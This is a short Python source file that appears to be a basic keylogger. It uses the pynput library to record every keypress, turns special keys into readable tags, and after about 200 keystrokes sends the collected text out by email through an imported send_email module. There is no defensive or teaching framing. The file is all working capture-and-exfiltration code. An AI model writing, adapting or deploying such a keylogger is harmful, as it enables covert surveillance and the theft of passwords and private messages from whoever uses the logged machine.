import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

def on_press(key):
    print(key, end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 200:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " " 
        elif key.find("Key")>0:
            k = ""
        if key == "Key.f12":
            raise SystemExit(0)
        if key == "Key.ctrl_l":
            k = "(CRT)"
        if key == "Key.enter":
            k = "(enter)"
        if key == "Key.tab":
            k = "(tab)"
        if key == "Key.alt_l":
            k = "(ALT)"
        if key == "Key.backspace":
            k = "(delete<-)"
        if key == "Key.delete":
            k = "(delete->)"
        if key == "Key.space":
            k = "_"
        if key == "Key.caps_lock":
            k = "(CAPS)"
        if key == "Key.shift":
            k = "(SHIFT)"
        if key == "Key.right":
            k = "(->)"
        if key == "Key.left":
            k = "(<-)"
        message += k
    print(message)
    send_email.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()